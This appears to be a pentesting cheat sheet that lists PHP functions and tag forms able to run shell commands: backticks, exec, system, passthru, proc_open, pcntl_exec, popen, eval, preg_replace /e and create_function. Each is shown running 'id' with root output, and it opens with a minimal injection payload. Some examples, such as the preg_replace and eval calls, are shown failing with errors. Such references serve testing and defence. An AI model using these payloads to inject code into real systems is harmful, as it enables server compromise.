## General note regarding PHP tags
```php
// this is a valid php tag
<?php phpinfo(); ?>
// this is equavalent to <?php echo phpinfo(); ?>
<?=phpinfo()?>
// this is the shortest payload i know to execute code
<?=`id`?>
```

## Bracketless Shell Execution: `Backtick`
```php
php > echo `id`;
```
### Output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `Exec` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > echo exec('id');
```
### output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `Passthru` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > passthru("id");
```
### output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `Proc_open` (PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)
```php
# first, define this variable
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
# start execution
php > proc_open('id > /tmp/id_output.txt', $descriptorspec, $pipes);
# verifying the execution occured
php > passthru('cat /tmp/id_output.txt');
```
### output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `Shell_exec` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > echo shell_exec('id');
```
### output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `System` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > system('id');
```
### output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `pcntl_exec` (PHP 4 >= 4.2.0, PHP 5, PHP 7, PHP 8)
```php
php > pcntl_exec('/bin/bash', array('-c', 'id'));
```
### Output
```
uid=0(root) gid=0(root) groups=0(root)
```

## Shell Execution: `popen` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > popen('id', 'w');
```
### Output
```
uid=0(root) gid=0(root) groups=0(root)
```

---

## PHP Execution: `Preg_replace` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > preg_replace('/.*/e', system('id') );
```
### output
```
uid=0(root) gid=0(root) groups=0(root)
PHP Warning:  Uncaught ArgumentCountError: preg_replace() expects at least 3 arguments, 2 given in php shell code:1
Stack trace:
#0 php shell code(1): preg_replace()
#1 {main}
  thrown in php shell code on line 1
```

## PHP Execution: `Eval` (PHP 4, PHP 5, PHP 7, PHP 8)
```php
php > eval(system('id'));
```
### Output
```
uid=0(root) gid=0(root) groups=0(root)
PHP Parse error:  syntax error, unexpected token "=" in php shell code(1) : eval()'d code on line 1
```

## PHP Execution: `Create_Function` (PHP < 8.0.0)
```php
php > $newfunc = create_function('$cmd', 'system($cmd);');
php > $newfunc('id');
```
### Output
```
uid=0(root) gid=0(root) groups=0(root)
```